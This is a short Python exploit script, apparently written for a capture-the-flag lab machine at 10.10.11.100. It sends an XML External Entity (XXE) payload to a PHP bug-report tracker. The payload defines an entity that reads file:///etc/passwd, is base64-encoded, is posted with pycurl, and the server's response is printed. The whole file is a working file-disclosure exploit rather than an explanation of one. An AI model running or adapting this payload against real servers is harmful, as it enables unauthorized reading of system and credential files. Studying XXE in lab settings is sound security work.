#!/usr/bin/python3

import requests
import urllib.parse
import base64

#------------------------------------------------------------------------------
# https://portswigger.net/web-security/xxe

IP = '10.10.11.100'

data = '<?xml  version="1.0" encoding="ISO-8859-1"?>\
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\
		<bugreport>\
		<title>&xxe;</title>\
		<cwe>cwe</cwe>\
		<cvss>score</cvss>\
		<reward>reward</reward>\
		</bugreport>'

data64 = str(base64.b64encode(data.encode('utf-8')), 'utf-8')

send_data = {
    'data' : data64
}

#------------------------------------------------------------------------------

import pycurl
import certifi
from io import BytesIO

c = pycurl.Curl()
buffer = BytesIO()
c = pycurl.Curl()
c.setopt(c.URL, 'http://' + IP + '/tracker_diRbPr00f314.php')
c.setopt(c.WRITEDATA, buffer)
c.setopt(c.CAINFO, certifi.where())
c.setopt(c.POSTFIELDS, urllib.parse.urlencode(send_data))
c.perform()
c.close()

body = buffer.getvalue()
# Body is a byte string.
# We have to know the encoding in order to print it to a text file
# such as standard output.
print(body.decode('iso-8859-1'))

